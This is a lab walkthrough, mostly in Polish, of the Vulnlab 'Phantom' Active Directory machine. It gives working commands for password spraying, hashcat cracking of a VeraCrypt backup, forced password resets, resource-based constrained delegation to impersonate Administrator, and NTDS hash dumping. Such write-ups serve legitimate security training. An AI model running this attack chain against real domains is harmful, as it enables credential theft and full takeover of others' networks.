# Phantom
Windows, Medium, created by **ar0x4**

![phantom_slide](https://github.com/user-attachments/assets/a2ab0f96-8bf4-4110-95a9-2bfc034c0c0e)

![{5A1A1B58-0E47-4052-8324-6C23854300A5}](https://github.com/user-attachments/assets/61246584-52b1-4638-b0b7-4748d3d90bfa)


```
3/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-21 17:04:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49850/tcp open  msrpc         Microsoft Windows RPC

```

![{BCAD721E-3AEB-42E1-85D4-6C51620E53A6}](https://github.com/user-attachments/assets/7f4c1df8-f58a-4d1f-9e5f-34e6d6bb8249)

![{DE25AF42-6685-467C-A9B2-12772B0C3FB6}](https://github.com/user-attachments/assets/05e5723a-d852-4950-9ce7-c1c31081de39)

```
nxc smb 10.10.92.153 -u users.txt -p users.txt --continue-on-success 
```
- nic. Leicmy na tego smbshare

![{1CCD2512-41CC-4556-AFDB-C8100A5FB8FF}](https://github.com/user-attachments/assets/f8fed704-15b8-4d0f-aeda-fdfa1e87e03d)

![{A28B7414-B927-45FC-A04C-1D70FA5C6F00}](https://github.com/user-attachments/assets/9f01accd-aa51-4b42-a8a7-1183721ea888)

![phantom](https://github.com/user-attachments/assets/8fe0c48c-3e7a-4345-9f4a-e993fb898b0b)

```
SMB         10.10.92.153    445    DC               [+] phantom.vl\ibryant:<pass from pdf>
```

![{34FA8F29-6268-44F9-B206-BE151E6500B3}](https://github.com/user-attachments/assets/af0f2ed6-a6c0-44ba-a4b0-c6d9a41919bb)

coś tam więcej widać.

![{2776E210-57D0-4427-8EE4-9EC0342FF352}](https://github.com/user-attachments/assets/da315171-9699-4c2a-ba04-83e1a7ef9764)

![{9DD76731-433F-4626-846E-A01CF43F8B74}](https://github.com/user-attachments/assets/49fe189d-fcac-411a-9c5c-3370e9511236)

coś tam ciekawie wygląda. .hc to będzie pliczek od veracrypta.

mamy podpowiedź z opisu na wiki `Should you need to crack a hash, use a short custom wordlist based on company name & simple mutation rules commonly seen in real life passwords (e.g. year & a special character).`

```
.\hashcat.exe -m 13721 X:\SHARED\vulnlab\Phantom\smbdump\IT\Backup\IT_BACKUP_201123.hc X:\SHARED\vulnlab\Phantom\smbdump\IT\phantomlist -r .\clem_and_best66_l33t_speek.rule -w 4 -O
```

![{423C0562-3C25-4DB5-B155-2684C5FFF437}](https://github.com/user-attachments/assets/6a532c9b-9f59-4cb0-a5f9-ee2b04fbd701)

![{7BE95A03-3DE6-485F-838A-3FD29FE68963}](https://github.com/user-attachments/assets/39c46219-16f8-4214-98a7-ea17be694613)

tooooo slow. I will generate my list on weakpass.com

![{073A73AD-2C62-4059-A348-13E503DA2B1B}](https://github.com/user-attachments/assets/03e28a96-a373-4335-b4c9-7f8ac001e7a9)

```
$2 $0 $1 $8
$2 $0 $1 $8 $!
$2 $0 $1 $8 $@
$2 $0 $1 $8 $#
$2 $0 $1 $8 $$
$2 $0 $1 $8 $%
$2 $0 $1 $8 $^
$2 $0 $1 $8 $&
$2 $0 $1 $8 $*
$2 $0 $1 $8 $(
$2 $0 $1 $8 $)
$2 $0 $1 $8 $-
$2 $0 $1 $8 $=
$2 $0 $1 $8 $+
$2 $0 $1 $9
$2 $0 $1 $9 $!
$2 $0 $1 $9 $@
$2 $0 $1 $9 $#
$2 $0 $1 $9 $$
$2 $0 $1 $9 $%
$2 $0 $1 $9 $^
$2 $0 $1 $9 $&
$2 $0 $1 $9 $*
$2 $0 $1 $9 $(
$2 $0 $1 $9 $)
$2 $0 $1 $9 $-
$2 $0 $1 $9 $=
$2 $0 $1 $9 $+
$2 $0 $2 $0
$2 $0 $2 $0 $!
$2 $0 $2 $0 $@
$2 $0 $2 $0 $#
$2 $0 $2 $0 $$
$2 $0 $2 $0 $%
$2 $0 $2 $0 $^
$2 $0 $2 $0 $&
$2 $0 $2 $0 $*
$2 $0 $2 $0 $(
$2 $0 $2 $0 $)
$2 $0 $2 $0 $-
$2 $0 $2 $0 $=
$2 $0 $2 $0 $+
$2 $0 $2 $0
$2 $0 $2 $0 $!
$2 $0 $2 $0 $@
$2 $0 $2 $0 $#
$2 $0 $2 $0 $$
$2 $0 $2 $0 $%
$2 $0 $2 $0 $^
$2 $0 $2 $0 $&
$2 $0 $2 $0 $*
$2 $0 $2 $0 $(
$2 $0 $2 $0 $)
$2 $0 $2 $0 $-
$2 $0 $2 $0 $=
$2 $0 $2 $0 $+
$2 $0 $2 $1
$2 $0 $2 $1 $!
$2 $0 $2 $1 $@
$2 $0 $2 $1 $#
$2 $0 $2 $1 $$
$2 $0 $2 $1 $%
$2 $0 $2 $1 $^
$2 $0 $2 $1 $&
$2 $0 $2 $1 $*
$2 $0 $2 $1 $(
$2 $0 $2 $1 $)
$2 $0 $2 $1 $-
$2 $0 $2 $1 $=
$2 $0 $2 $1 $+
$2 $0 $2 $2
$2 $0 $2 $2 $!
$2 $0 $2 $2 $@
$2 $0 $2 $2 $#
$2 $0 $2 $2 $$
$2 $0 $2 $2 $%
$2 $0 $2 $2 $^
$2 $0 $2 $2 $&
$2 $0 $2 $2 $*
$2 $0 $2 $2 $(
$2 $0 $2 $2 $)
$2 $0 $2 $2 $-
$2 $0 $2 $2 $=
$2 $0 $2 $2 $+
$2 $0 $2 $3 $!
$2 $0 $2 $3 $@
$2 $0 $2 $3 $#
$2 $0 $2 $3 $$
$2 $0 $2 $3 $%
$2 $0 $2 $3 $^
$2 $0 $2 $3 $&
$2 $0 $2 $3 $*
$2 $0 $2 $3 $(
$2 $0 $2 $3 $)
$2 $0 $2 $3 $-
$2 $0 $2 $3 $=
$2 $0 $2 $3 $+
$2 $0 $2 $4
$2 $0 $2 $4 $!
$2 $0 $2 $4 $@
$2 $0 $2 $4 $#
$2 $0 $2 $4 $$
$2 $0 $2 $4 $%
$2 $0 $2 $4 $^
$2 $0 $2 $4 $&
$2 $0 $2 $4 $*
$2 $0 $2 $4 $(
$2 $0 $2 $4 $)
$2 $0 $2 $4 $-
$2 $0 $2 $4 $=
$2 $0 $2 $4 $+
```

starting with this.
```
.\hashcat.exe -m 13721 X:\SHARED\vulnlab\Phantom\smbdump\IT\Backup\IT_BACKUP_201123.hc X:\SHARED\vulnlab\Phantom\smbdump\IT\phantomlist2 -d 1 -w 4 -O
```

![{C63C4B14-2F9D-421D-888A-60E5D697F6FF}](https://github.com/user-attachments/assets/c39508bb-287e-4b0a-b37c-04a611dc2a78)

yeeeeee

```
veracrypt --text \
          --mount IT_BACKUP_201123.hc \
          /media/veracrypt1 \
          --pim=0 \
          --keyfiles="" \
          --password=<cracked passwopord>

```

![{04777C14-BCE7-4707-ACA9-793D58344B5D}](https://github.com/user-attachments/assets/3cea59cf-4c88-48d3-825d-be9e1cd28e34)

![{5428D146-A2E3-4088-AA2A-9AF96AA72392}](https://github.com/user-attachments/assets/93349292-d8c0-4229-9255-597dec9ea678)

![{BC38F83D-271D-4864-BE0F-C8413E554DA9}](https://github.com/user-attachments/assets/452122d8-5e0a-48ad-bc38-f3570f598d0f)

![{2F5D4899-C1FD-4BF8-91E4-38C0942CAE0F}](https://github.com/user-attachments/assets/a70b28e7-33db-4293-ac53-0249a870b417)


ogólnie sporo przeglądanie będzie

![{B10A1380-E344-44D5-B9F1-FD7498C048E3}](https://github.com/user-attachments/assets/e5c9f5f0-dd8a-4838-be69-81f1e1dd044f)

ale sypie.

```
grep -ir password
```

![password](https://github.com/user-attachments/assets/4243d06c-0ee8-41ce-8948-e04038f9231f)

dało jakieś hasło.
```
nxc smb 10.10.92.153 -u users.txt -p '<nasze hasełko>' --continue-on-success

SMB         10.10.92.153    445    DC               [+] phantom.vl\svc_sspr:<nasze hasełko>
```

to trochę enumeracji machnę
```
bloodhound-python -d 'phantom.vl' -u 'svc_sspr' -p '<nasze hasełko>' -ns 10.10.92.153 -dc DC.phantom.vl -c all
```

przy okazji

![{B176AB9A-08E3-4CA9-91DF-55BBB95ABC6A}](https://github.com/user-attachments/assets/095f9875-d0bb-401c-8970-3ac8286a83ab)

![{29D8488C-2C26-456C-A500-C15E66DD4E56}](https://github.com/user-attachments/assets/134eae7e-0932-408f-9d95-082fd91be261)

![{B441CF78-0F98-46C3-9B05-E4F58D0ECAD2}](https://github.com/user-attachments/assets/4e97a5ff-8867-458f-a5dd-89a4b88349eb)

wygląda okey, ale szukamy dalej.

![{543C6B38-8093-4443-9C9D-6129EC402051}](https://github.com/user-attachments/assets/e2777624-b700-4f76-8509-fe73f9c46bad)

o mamy zwycięzce

```
net rpc password 'crose' 'P@ssw0rd' -U "DC.phantom.vl"/"svc_sspr"%"<hehe nope>" -S "DC.phantom.vl"
net rpc password 'wsilva' 'P@ssw0rd' -U "DC.phantom.vl"/"svc_sspr"%"<hehe nope>" -S "DC.phantom.vl"
net rpc password 'rnichols' 'P@ssw0rd' -U "DC.phantom.vl"/"svc_sspr"%"<hehe nope>" -S "DC.phantom.vl"
```

dobra użyjmy tego uprawnienia wyżej.
```
nxc ldap phantom.vl -u svc_sspr -p '<hehe nope>' -M maq
```

![{4E481891-9DD2-484E-9DA1-6B008F2F0308}](https://github.com/user-attachments/assets/7f93e244-bc43-4dac-bc10-428e548fe567)

P@ssw0rd -> e19ccf75ee54e06b06a5907af13cef42

```
impacket-getTGT -hashes :e19ccf75ee54e06b06a5907af13cef42 phantom.vl/crose
python3 smbpasswd.py -newhashes :3af23a7ed7f626d6be9ad455ebf89256 phantom.vl/crose:'P@ssw0rd'@dc.phantom.vl
impacket-rbcd -delegate-from 'crose' -delegate-to 'DC$' -dc-ip 10.10.92.153 -action 'write' 'phantom.vl'/'crose' -hashes :3af23a7ed7f626d6be9ad455ebf89256
export KRB5CCNAME=crose.ccache
impacket-getST -u2u -impersonate Administrator -spn 'cifs/dc.phantom.vl' -k -no-pass phantom.vl/'crose'
export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache
impacket-secretsdump -k dc.phantom.vl
```

![{CEED6969-39A4-4286-AD17-8040FA3F360E}](https://github.com/user-attachments/assets/d2359cea-d4f4-4ad6-a742-39fa35bb1559)

co ciekawe dalo mi to hash `Administrator`'a, który nie działa.
SPróbowałem innej metody i dostałem inny hash. Ten działa
```
nxc smb 10.10.92.153 --use-kcache --ntds
```

![{CE9A5811-1480-421E-A969-5AAB5E1B848C}](https://github.com/user-attachments/assets/692fb59d-751d-4615-8a61-f9c14522d670)

FINISH
